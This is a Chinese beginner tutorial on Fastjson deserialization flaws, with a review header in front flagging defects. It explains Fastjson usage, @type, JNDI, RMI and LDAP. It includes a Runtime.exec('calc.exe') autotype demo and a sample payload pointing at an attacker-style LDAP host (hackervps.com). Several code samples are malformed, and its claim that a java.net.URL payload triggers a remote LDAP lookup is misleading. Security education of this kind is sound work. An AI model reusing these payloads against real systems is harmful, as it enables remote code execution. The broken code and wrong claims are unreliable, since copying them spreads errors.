---
cve: "CVE-2017-18349"
product: "Fastjson plus Java/JNDI/RMI/LDAP foundations"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2017-18349"
referenced_identifiers: "CVE-2022-25845"
identifier_role: "primary"
identifier_status: "unknown"
title: "两万字原创长文 完全零基础入门 Fastjson 系列漏洞（基础篇）"
prerequisites: "来源所述条件，未列明部分仍待核：Basic1.2.50, exploit1.2.23/25/42/43/44/47/68; Java17 Tomcat11-M4 introduction then8u181/8u65 exploit labs; no unified fix matrix"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/20sJNNRMxSA_7ySbppc3SQ"
id: "vw-de2d5fac8aa1a6b3417da1dd"
entity_id: "ve-de2d5fac8aa1a6b3417da1dd"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Basic1.2.50, exploit1.2.23/25/42/43/44/47/68; Java17 Tomcat11-M4 introduction then8u181/8u65 exploit labs; no unified fix matrix

代码与实验材料：Many full Java examples/source explanations; several malformed source strings/XML and inconsistent outputs; detailed source screenshots uninspected

来源证据范围：Original WeChat and dozens credited research URLs, official tool/archive sources; no systematic immutable patch links

- **结论使用边界（1）**：Misleading broad claim: reflection does not generally bypass permission checks; public Runtime.exec reflection demo proves no such boundary bypass；依据：反射机制可以绕过Java安全机制的限制。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：URL construction conflated with JNDI lookup/remote execution; default URL handler/trigger assumptions missing；依据：java.net.URL ldap://... executes exp operation。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **代码与转录边界（3）**：Compilation/configuration and binding contradictions make several foundational demos unusable as pasted；依据：JSONObject jsonObject=JSON.parse(s1); malformed Person.toString; &lt;Resource... user ...&gt;; jdbc/root versus jdbc/security。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **结论使用边界（4）**：JDK protocol boundaries inconsistent/inclusive; addAccept prefixes conflated with globally enabling AutoType; Runtime demo itself explicitly execs command。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（5）**：Collapsed TOC, Main.py/pom naming slips, repeated snippets and fragmented links。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 【两万字原创长文】完全零基础入门 Fastjson 系列漏洞（基础篇）

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/20sJNNRMxSA_7ySbppc3SQ)

零、前言与目录
=======

        我在学习`Java`漏洞的时候，感觉很痛苦，不知道从何学起，因为我的`Java`基础实在是太烂了，而且网上的关于这方面的文章，要么就给我这个初学者一种高深莫测、没多少基础就没法理解的感觉，要么就是写的实在是太过简略，没有系统性强、通俗易懂、小白友好的文章，于是我决定自己死磕，遇到不会的就去百度、谷歌、问`chatgpt`以及问`Java`安全大牛师傅们，于是就有了这一系列的文章。 

        本文作为`Java`安全亲妈级零基础教程的第一篇`Fastjson`漏洞的基础篇，从前置知识开始讲起，然后过渡到漏洞的复现和代码的分析，本文一共近`18000`字，配图`108`张，配图足够详细清除，跟着复现分析基本可以搞明白这些漏洞是怎么一回事。提高篇会重点研究`Fastjson`的其他`payload`和`Fastjson`的不出网利用上，会在下一次更新。

        我在学习`Fastjson`相关漏洞的时候，掌握基础之后再看师傅们的分析文章，常常不由得拍手称快，心里由衷地佩服发现这些利用链的师傅们，利用链是如此的巧妙，和开发者们之间的一攻一防真是让人觉得酣畅淋漓，精彩不绝。在写这系列的文章的时候，我常常能进入到久违的” 心流 “状态，丝毫感觉不到时间的流逝，版本之间的不同、开发者和白帽子之间对弈的场景与时间轴仿佛就呈现在我的眼前，如同过电影一般，快哉快哉！

        在学习的过程中，我阅读参考了数十篇师傅的文章，这些都被我列在文末，以表感谢。 

        本文写作的时候，由于经常熬夜，出错之处在所难免，还望师傅们指出来，我会在下篇文章的开头感谢提出来的师傅们！ 

        欢迎师傅们添加我的微信，拉交流群：

![](../../.resource/remote/00f40e319ef8ff9858fd29c73cfecf29154c1f1356744ea281ad54f864a74209.jpg)        

        本文目录：

零、前言与目录一、前置知识    1. fastjson 怎么用？        （1）在 IDEA 中新建一个 maven 项目，并引入 fastjson 依赖        （2）一个简单的 demo        （3）更进一步改动理解上述 demo 代码                ①问题 1：`Person person2 = JSON.parseObject(jsonString2, Person.class);`这里为什么可以直接使用`Person.class`来进行映射？                ②问题 2：为什么我初始化对象的时候，代码明明写的是`Person person = new Person("Alice", 18);`，`name`在前，`age`在后，怎么转化成`json`字符串的时候就变成了`age`在前，`name`在后了？    2. @type 是什么东西？如何反序列化带 @type 的 json 字符串？    3. JNDI 是什么东西？        （1）整一个 tomcat 容器，并在容器中配置数据源        （2）去 IDEA 里面配置 web        （3）跑 jndi 的 demo 代码，感受 jndi 的用处    4. RMI 是什么东西？        （1）通过一个 demo 快速认识 rmi 是如何调用的        （2）深入理解 rmi    5. ldap 是什么？        （1）安装并配置 ldap 服务器        （2）通过公司 - 员工管理的例子来理解 Fastjson 系列漏洞中 ldap 的作用    6. java 反射是什么？        （1）通过 demo 快速理解反射问题：我还是觉得你给出的例子体现不出灵活，怎么办？        （2）【关键！】和漏洞之间的联系？二、漏洞学习    1. fastjson<=1.2.24 反序列化漏洞（CVE-2017-18349）（学习 TemplatesImpl 链的相关知识）        （1）漏洞简单复现        （2）漏洞成因分析                ①问题 1：为什么要继承`AbstractTranslet`类？                ②为什么要这么构造`json`？    2. fastjson 1.2.25 反序列化漏洞（学习 JdbcRowSetImpl 链的相关知识）        （1）黑白名单机制介绍        （2）黑白名单绕过的复现        （3）对两种 poc 绕过手法的分析                ①第一种 poc（1.2.25-1.2.47 通杀！！！）                ②第二种 poc        （4）关于 JdbcRowSetImpl 链利用的分析    3. fastjson 1.2.42 反序列化漏洞    4. fastjson 1.2.43 反序列化漏洞    5. fastjson 1.2.44 mappings 缓存导致反序列化漏洞    6. fastjson 1.2.47 mappings 缓存导致反序列化漏洞    7.fastjson 1.2.68 反序列化漏洞四、参考与致谢

一、前置知识
======

1. fastjson 怎么用？
----------------

`fastjson`是啥百度就有，看了之后不熟悉的人还是会一脸懵逼，我们可以通过以下这个小例子来快速学会使用`fastjson`。我们分为以下几个步骤来进行：

### （1）在 IDEA 中新建一个 maven 项目，并引入 fastjson 依赖

![](../../.resource/remote/1d75dff8c331894e2e3bb9e476cb57ad9c6cebbaa689505c5284d10e7e798a2e.png)![](../../.resource/remote/e9227f8541ea536ac014e0c0480342f8224cf7416ac7e5778ed12f5524a5ba98.png)选择`Maven`，然后给随便取个名字，例如我起名`fastjson_research`。然后在 pom.xml 这里的末尾，添加如下内容：

```
<dependencies>
    <dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.50</version>
    </dependency>
</dependencies>


```

![](../../.resource/remote/c91595c0d676d1a88dcab0f135d1a92cf3f4fd53a5a06888b6878a6c3eee5144.png)具体`Maven`的各个依赖的详细信息我们可以在这个网站上面查得到：

```
https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.50


```

然后点击右侧的`Maven`，然后点击`Reload All Maven Projects`：![](../../.resource/remote/11db16a2661ea63cc62d761a83c88dbc3f2fcaecad5eb79b31b20e847b8f0754.png)

### （2）一个简单的 demo

```
package org.example;
import com.alibaba.fastjson.JSON;

public class Main {

    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Alice", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"age\":20,\"name\":\"Bob\"}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    public static class Person {
        private String name;
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public int getAge() {
            return age;
        }
    }
}


```

运行之后输出结果如下：![](../../.resource/remote/6c5a57f87dbcd9279630f76d96adf8bf7c8cbc65a26181781f153048cf8a752c.png)通过以上代码我们可以看到，我们定义了一个`Person`类，并设置了两个属性`age`以及`name`，以及简单定义了四个方法。我们通过`Person person = new Person("Alice", 18);`来初始化对象，再通过`String jsonString = JSON.toJSONString(person);`去把对象转化为`json`字符串，非常方便快捷；完事之后，我们又可以通过`Person person2 = JSON.parseObject(jsonString2, Person.class);`把`json`字符串转换为`Java`对象，非常简单快捷。

### （3）更进一步改动理解上述 demo 代码

其实上面给出的代码是有一些问题的，这个问题并不是指代码本身错误。

#### ①问题 1：`Person person2 = JSON.parseObject(jsonString2, Person.class);`这里为什么可以直接使用`Person.class`来进行映射？

在使用`fastjson`时，我们需要先将`JSON`字符串和`Java`对象之间建立映射关系，可以通过类的属性和`JSON`字段名进行映射。在我们上面的代码中，`Java`类的属性名和`JSON`字段名是相同的，因此可以直接使用`Person.class`来进行映射。**如果不同我们该怎么办？**我们可以通过使用注解来指定它们之间的映射关系。在`fastjson`中，可以使用`@JSONField`注解来指定`Java`类的属性和`JSON`字段之间的映射关系。请看以下`demo`代码：

```
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.annotation.JSONField;

public class Main {

    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Alice", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"user_name\":\"Bob\",\"user_age\":20}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    public static class Person {
        @JSONField(name = "user_name")
        private String name;
        @JSONField(name = "user_age")
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public int getAge() {
            return age;
        }

        public void setAge(int age) {
            this.age = age;
        }
    }
}


```

![](../../.resource/remote/16c1a33a75f1bad1d6b4d825a61d0aae62cc38292ac6e9257e0e6b207b6fa926.png)可以看到，我们在定义`name`和`age`的时候，在上面分别加入了一行`@JSONField(name = "user_name")`和`@JSONField(name = "user_age")`，这样一来，即使我们输入的字符串中写的是`user_name`和`user_age`，它也能被识别解析到。

#### ②问题 2：为什么我初始化对象的时候，代码明明写的是`Person person = new Person("Alice", 18);`，`name`在前，`age`在后，怎么转化成`json`字符串的时候就变成了`age`在前，`name`在后了？

原来，在`fastjson`中，默认情况下，生成的`JSON`字符串的顺序是按照**属性的字母顺序**进行排序的，而不是按照属性在类中的声明顺序。如果我们希望按照属性在类中的声明顺序来生成`JSON`字符串，可以通过在类中使用`@JSONType`注解来设置属性的序列化顺序，请看下面的代码：

```
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.annotation.JSONType;

public class Main {

    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Alice", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"name\":\"Bob\",\"age\":20}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    @JSONType(orders = {"name", "age"})
    public static class Person {
        private String name;
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public int getAge() {
            return age;
        }

        public void setAge(int age) {
            this.age = age;
        }
    }
}


```

![](../../.resource/remote/9359935cbd626e63ab319b5d9ad83d5abe70b97ae34675a1121a5323bb5ab0d7.png)我们通过`@JSONType(orders = {"name", "age"})`来指定属性的序列化顺序，这样就是`name`在前，`age`在后了。

2. @type 是什么东西？如何反序列化带 @type 的 json 字符串？
----------------------------------------

> 参考：https://www.cnblogs.com/nice0e3/p/14601670.html

我们在网上看到了很多讲`fastjson`反序列化漏洞的文章，里面都提到了`@type`，那么它到底是什么呢？`@type`是`fastjson`中的一个特殊注解，用于标识`JSON`字符串中的某个属性是一个`Java`对象的类型。具体来说，当`fastjson`从`JSON`字符串反序列化为`Java`对象时，如果`JSON`字符串中包含`@type`属性，`fastjson`会根据该属性的值来确定反序列化后的`Java`对象的类型。请看以下代码：

```
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {
        String json = "{\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\"}";
        ParserConfig.getGlobalInstance().addAccept("java.lang");
        Runtime runtime = (Runtime) JSON.parseObject(json, Object.class);
        runtime.exec("calc.exe");
    }
}


```

可以看到直接弹窗了：![](../../.resource/remote/de00ee289e4aaee0bde1e3f93cf525a8d8e5aa6ae907ef18780de40edc988689.png)由于`fastjson`在`1.2.24`之后默认禁用 Autotype，因此这里我们通过`ParserConfig.getGlobalInstance().addAccept("java.lang");`来开启，否则会报错`autoType is not support`。我们再看这样的一个`demo`：首先是类的定义，例如我们的`Person.java`：

```
package org.example;

public class Person {
    private String name;
    private int age;

    public Person() {}

    @Override
    public String toString() {
        return "Person{" +
                " + name + '\'' +
                ", age=" + age +
                '}';
    }

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}


```

然后是`Main.java`：

```
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class Main {
    public static void main(String[] args) {
        Person user = new Person();
        user.setAge(18);
        user.setName("xiaoming");
        String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(s1);
    }
}


```

输出结果为：![](../../.resource/remote/9e1037c878859d945898905c1508b82eb2f7aab149e4b9008239c477dfae846d.png)在和前面代码做对比后，可以发现其实就是在调用`toJSONString`方法的时候，参数里面多了一个`SerializerFeature.WriteClassName`方法。传入`SerializerFeature.WriteClassName`可以使得`Fastjson`支持自省，开启自省后序列化成`JSON`的数据就会多一个`@type`，这个是代表对象类型的`JSON`文本。`FastJson`的漏洞就是他的这一个功能去产生的，在对该`JSON`数据进行反序列化的时候，会去调用指定类中对于的`get/set/is`方法， 后面会详细分析。然后我们就可以通过以下三种方式来反序列化`json`字符串了：

```
// 方法一（返回JSONObject对象）：
Person user = new Person();
user.setAge(18);
user.setName("xiaoming");
String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
JSONObject jsonObject = JSON.parse(s1);
System.out.println(jsonObject);

// 方法二：
Person user = new Person();
user.setAge(18);
user.setName("xiaoming");
String s = JSON.toJSONString(user);
Person user1 = JSON.parseObject(s, Person.class);
System.out.println(user1);

// 方法三：
Person user = new Person();
user.setAge(18);
user.setName("xiaoming");
String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
Person user1 = JSON.parseObject(s1,Person.class);
System.out.println(user1);


```

执行结果都是一样的：

```
Person{name='xiaoming', age=18}


```

3. JNDI 是什么东西？
--------------

`JNDI`是`Java`平台的一种`API`，它提供了访问各种命名和目录服务的统一方式。`JNDI`通常用于在`JavaEE`应用程序中查找和访问资源，如`JDBC`数据源、`JMS`连接工厂和队列等。光这么说还是太抽象了，直接上例子。如果我们想要搭建一个`jndi`的环境，我们需要这么做：首先需要说明的是我`Java`版本是`17`，如果不是的话需要安装配置，不然后面的可能会报错，百度谷歌都没用的那种。

### （1）整一个 tomcat 容器，并在容器中配置数据源

打开`[https://tomcat.apache.org/](https://tomcat.apache.org/)`，然后点击`Download`：![](../../.resource/remote/1fbf7849092b3b8910350a61588be69c74d03553aca297ddfc589a20bea418a8.png)这里直接选择下载`64`位`Windows`的压缩包：![](../../.resource/remote/9fe79d158e71774dc5ef8383564345e46f573e5991bb7a9b0cacd0bc0e18cf36.png)下载链接：https://dlcdn.apache.org/tomcat/tomcat-11/v11.0.0-M4/bin/apache-tomcat-11.0.0-M4-windows-x64.zip 解压之后，可以给改一个简洁一点的名字，例如`tomcat`，然后把`bin`目录放到环境变量中，如下图：![](../../.resource/remote/1ecd1a05c36f1e3428776317daa5b9421a9aa8283acead6fd794e60351de8ec8.png)然后再新建一个名为`CATALINA_HOME`的路径，值为`tomcat`的根目录，例如我的：![](../../.resource/remote/0f70d387457ec45b27c78300000f2fa8b7a68b1b73741a52a7788986166200ff.png)除此之外，没有配置`JAVA_HOME`和`JRE_HOME`的也要在用户变量中配置一下，需要注意的是，我这里貌似需要安装并配置`Java17`，否则一直闪退无法启动：![](../../.resource/remote/f58700e4ed7034ebd4f0ab1afe1f68ee3a71113013109fd930041f731999a3f2.png)双击`tomcat`的`bin`目录下的`startup.bat`，然后访问`[http://localhost:8080/](http://localhost:8080/)`，就可以看到服务启动成功了：![](../../.resource/remote/c66fba582bd23a1df70a134d22d021b74c8be21681c59affab9ee69dfd4e481d.png)然后配置`tomcat`目录下的`context.xml`（`tomcat7`及以前则是配置`server.xml`）：

```
 <Resource 
             maxTotal="100" maxIdle="30" maxWaitMillis="10000"
             user
             url="jdbc:mysql://localhost:3306/security"/>


```

![](../../.resource/remote/735d0a1b2f53c6130ea14e493476ecd3249ac90de7a7bba1cb2a548833aee190.png)可以根据自己本地开启的`mysql`的实际情况来改，我这里是使用`phpstudy`来安装开启`mysql`的：![](../../.resource/remote/71378ea3688c75855e73f08c6cd91590d00ebb6d5b66ef37d04e5e6084ca57c5.png)![](../../.resource/remote/90e1a91ddab05f46d2f778d6e768d955475719d7e7431a9cf6787df1f29e9a9b.png)然后继续配置`tomcat`的`conf`目录下的`web.xml`：

```
<resource-ref>
    <description>Test DB Connection</description>
    <res-ref-name>jdbc/root</res-ref-name>
    <res-type>javax.sql.DataSource</res-type>
    <res-auth>Container</res-auth>
</resource-ref>


```

![](../../.resource/remote/b78a66112cc9ed9ea18b967db29e34ed56b9c6cbddc636496ddcd38bb0b6ee48.png)image.png

### （2）去 IDEA 里面配置 web

首先先新建一个项目，我命名为`jndi_demo`：![](../../.resource/remote/cc2b223102bcc63ff1903ab02264e9313e00ddd2ee4ceb2044a1c25e689bc655.png)接着配置`tomcat`：![](../../.resource/remote/65f0087bc2cf36111f2eb9b4d5dc730446934d9a521dee0ee78f88ff206bd98b.png)这里我选择了`8089`端口，因为我`8080`端口之前被我占用了：![](../../.resource/remote/350df3fe1abb2d7bb268528e22f1a64601432a8a0cb804b2e6d5cfd8a57080d1.png)然后：![](../../.resource/remote/cd4381deeb1c4d546b7a11dba520f9d7c73921ba16f2cf6dcf69121cbf4787bf.png)![](../../.resource/remote/f4ce3c7e5419f6f6344961190061077c4e9be289e8f4536bc848899c5d2682c5.png)![](../../.resource/remote/ae93527e75a9150a58aae965ea474f2e4be9efa3ea975c22da29c67f1e5f84ce.png)![](../../.resource/remote/db5ea1272952a0aa10d036549c653e3c3d6ae1925e8fd96caf5d5be2f04d7065.png)![](../../.resource/remote/08b21d0091a4700ebcf5969c678e2b4b126daff22d21bae47de8ab6062639a31.png)![](../../.resource/remote/2b004c9719a10380c10f6d2fab6892608ce82aa57e3f364e9a0d78401a77b855.png)![](../../.resource/remote/b85e5d23d52259b2558bf1783053a1b5e7a6d6ce86b0d7214ff1165a295cff78.png)![](../../.resource/remote/db025add6cbaacc8501404ce89d7d933651bd5ad99abf8b4338c99db6bf8d18e.png)然后填写代码运行配置：![](../../.resource/remote/1a93fa09061874f3e62b264158c3de5d329c97cda7714a03e5c55ade11c5bbd8.png)![](../../.resource/remote/0dfd4648f21fff7873a34d2c1e00f3a3c289be0a84c585f71a8043b9b5137061.png)

### （3）跑 jndi 的 demo 代码，感受 jndi 的用处

然后贴上如下代码：

```
package org.example;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.sql.DataSource;
import java.io.IOException;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.Statement;

@WebServlet("/test")
public class Test extends HttpServlet {

    @Override
    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            // 获取JNDI上下文
            Context ctx = new InitialContext();

            // 查找数据源
            Context envContext = (Context) ctx.lookup("java:/comp/env");
            DataSource ds = (DataSource) envContext.lookup("jdbc/security");

            // 获取连接
            Connection conn = ds.getConnection();

            System.out.println("[+] success!");

            // 执行查询
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("select * from security.emails;");

            // 处理结果集
            while (rs.next()) {
                System.out.println(rs.getString("email_id"));
            }

            // 关闭连接
            rs.close();
            stmt.close();
            conn.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}


```

成功跑起来了：![](../../.resource/remote/9001c4a75e5b57892dd24b78bac1c719faf49c5be0a6532ba8d41843263e0e33.png)然后访问`[http://localhost:6063/test](http://localhost:6063/test)`：![](../../.resource/remote/ffc5fec4d2426e87e009e196423113ec3d52338172390a2593488475e7b23610.png)没有出现`404`，说明`WebServlet`拦截成功，回到`idea`，发现查询成功：![](../../.resource/remote/12a3af1e888ca40489ba7af178f0854892aa8ce654cbebb5c0c8a7030d6aeb37.png)

4. RMI 是什么东西？
-------------

### （1）通过一个 demo 快速认识 rmi 是如何调用的

`RMI`指的是远程方法调用（`Remote Method Invocation`），是`Java`平台提供的一种机制，可以实现在不同`Java`虚拟机之间进行方法调用。这么说是真抽象，我们直接看下面使用了`RMI`的`demo`代码，包括一个服务器端和一个客户端。这个`demo`实现了一个简单的计算器程序，客户端通过`RMI`调用服务器端的方法进行加、减、乘、除四则运算。首先是一个计算器接口：

```
package org.example;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface Calculator extends Remote {
    public int add(int a, int b) throws RemoteException;

    public int subtract(int a, int b) throws RemoteException;

    public int multiply(int a, int b) throws RemoteException;

    public int divide(int a, int b) throws RemoteException;
}


```

然后是客户端代码：

```
package org.example;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client {
    private Client() {}

    public static void main(String[] args) {
        try {
            // Get the registry
            Registry registry = LocateRegistry.getRegistry("localhost", 1060);

            // Lookup the remote object "Calculator"
            Calculator calc = (Calculator) registry.lookup("Calculator");

            // Call the remote method
            int result = calc.add(5, 7);

            // Print the result
            System.out.println("Result: " + result);
        } catch (Exception e) {
            System.err.println("Client exception: " + e.toString());
            e.printStackTrace();
        }
    }
}


```

接着是服务端代码：

```
package org.example;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class Server extends UnicastRemoteObject implements Calculator {
    public Server() throws RemoteException {}

    @Override
    public int add(int x, int y) throws RemoteException {
        return x + y;
    }

    @Override
    public int subtract(int a, int b) throws RemoteException {
        return 0;
    }

    @Override
    public int multiply(int a, int b) throws RemoteException {
        return 0;
    }

    @Override
    public int divide(int a, int b) throws RemoteException {
        return 0;
    }

    public static void main(String args[]) {
        try {
            Server obj = new Server();
            LocateRegistry.createRegistry(1060);
            Registry registry = LocateRegistry.getRegistry(1060);
            registry.bind("Calculator", obj);
            System.out.println("Server ready");
        } catch (Exception e) {
            System.err.println("Server exception: " + e.toString());
            e.printStackTrace();
        }
    }
}


```

然后开始跑程序，不需要做任何配置。先把服务端跑起来：![](../../.resource/remote/c52609759b7d6640759163dcae1109a5fd9ded4b917bd11eca1f73d11046cc86.png)然后客户端这里就可以直接运行`5+7`的结果了：![](../../.resource/remote/636ba16be10e311db9fee8f845f384b20e218c32af3985f8e19e19ad481be9dd.png)

### （2）深入理解 rmi

建议直接看素十八师傅的博客以及天下大木头的微信公众号文章，写的真的是太好了，都是适合细细品味的文章。

> https://su18.org/post/rmi-attack/[https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA](https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&mid=2247483995&idx=1&sn=cbde0f2653149413629e8e878a798905&scene=21#wechat_redirect)

5. ldap 是什么？
------------

`LDAP`是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。在`Java`安全中，`LDAP`通常用于集成应用程序与企业目录服务（例如`Microsoft Active Directory`或`OpenLDAP`）的认证和授权功能。使用`Java`的`LDAP API`，我们可以编写`LDAP`客户端来执行各种`LDAP`操作，如绑定（`bind`）到`LDAP`服务器、搜索目录、添加、修改和删除目录条目等。`Java LDAP API`支持使用简单绑定（`simple bind`）或`Kerberos`身份验证（`Kerberos authentication`）进行`LDAP`身份验证。`Java`应用程序可以使用`LDAP`来实现单点登录和跨域身份验证，并与其他应用程序和服务共享身份验证信息。`LDAP`还可以用于管理用户、组和权限，以及存储和管理应用程序配置信息等。总结：`Java`中的`LDAP`是一种使用`Java`编写`LDAP`客户端来集成企业目录服务的技术，可以提供安全的身份验证和授权功能，以及方便的用户和配置管理。这么说还是太抽象了，我们还是看一个`demo`来快速熟悉一下吧。

### （1）安装并配置 ldap 服务器

这里我们选择`OpenLDAP`来进行安装。官网只提供了`Linux`版本，我们可以去德国公司`maxcrc`的官网上面去下载`openldap for windows`：

> https://www.maxcrc.de/en/download-en/

这里我们选择`64`位的，懒人链接：https://www.maxcrc.de/wp-content/uploads/2020/04/OpenLDAPforWindows_x64.zip ![](../../.resource/remote/7826faa4eacd7de22987176986a1dc3818309bbccc9807e0bb269f091a744927.png) 然后参考这篇文章进行安装：

> https://blog.csdn.net/oscar999/article/details/108654461

成功启动`ldap`服务：![](../../.resource/remote/0389bf729c231dcd862a4347b39f31e5d04262aafca528d5a6d48be4b9be38e0.png)顺便一提，在 Windows 上可以使用 LDAP Browser 来快速浏览查看查询，官网及下载地址如下：

> https://ldapbrowserwindows.com/https://ldapclient.com/downloads610/LdapBrowser-6.10.x-win-x86-Setup.msi

啪的一下就连接上了，快啊，很快啊：![](../../.resource/remote/16309560539caf059b2725491ec62b635322648750a2ec8275f81bc921cc840d.png)

### （2）通过公司 - 员工管理的例子来理解 Fastjson 系列漏洞中 ldap 的作用

假设有一个名为 "`example.com`" 的公司，需要存储和管理员工信息。他们使用`LDAP`作为员工信息的目录服务，每个员工都在`LDAP`中有一个唯一的标识符（`DN`）。这里我们举两个员工例子：

```
DN: uid=john,ou=People,dc=example,dc=com
cn: John Doe
sn: Doe
givenName: John
uid: john
userPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=

DN: uid=alice,ou=People,dc=example,dc=com
cn: Alice Smith
sn: Smith
givenName: Alice
uid: alice
userPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=


```

在`LDAP`中，`DN`是一个唯一的标识符，它类似于文件系统中的路径。每个`DN`由多个`RDN`（相对区分名称）组成，例如：

```
uid=john,ou=People,dc=example,dc=com


```

这个`DN`由三个`RDN`组成：`uid=john`、`ou=People`、`dc=example,dc=com`。可以使用如下`LDAP`查询语句来检索员工信息，例如：`(&(objectClass=person)(uid=john))`这个查询语句表示查找所有`objectClass`为`person`，且`uid`为`john`的员工信息。在`LDAP`中，查询语句使用`LDAP`搜索过滤器（`LDAP Search Filter`）进行筛选。在`Fastjson`漏洞中，攻击者可以通过构造特定的`LDAP`查询语句，来执行任意代码或获取敏感信息。例如，以下`JSON`字符串包含一个恶意构造的`LDAP URL`：

```
{"@type":"java.net.URL","val":"ldap://hackervps.com/exp"}


```

当`Fastjson`解析该`JSON`字符串时，会触发`LDAP`查询操作，查询`hackervps.com`上的`LDAP`服务，并执行名为 “`exp`” 的操作。这就是`Fastjson`漏洞的成因之一。

6. java 反射是什么？
--------------

参考：

> https://www.javasec.org/javase/Reflection/Reflection.html

### （1）通过 demo 快速理解反射

如果我们不用反射的话，我们写的代码会是下面这样：`Person.java`：

```
package org.example;

public class Person {
    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public void sayHello() {
        System.out.println("Hello, my name is " + name + ", I'm " + age + " years old.");
    }

    public void setAge(int age) {
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                " + name + '\'' +
                ", age=" + age +
                '}';
    }
}


```

`Main.java`：

```
package org.example;

public class Main {
    public static void main(String[] args) {
        // 创建Person对象
        Person person = new Person("张三", 20);

        // 调用Person对象的sayHello方法
        person.sayHello();

        // 修改Person对象的age属性
        person.setAge(30);

        // 输出修改后的Person对象信息
        System.out.println(person);
    }
}


```

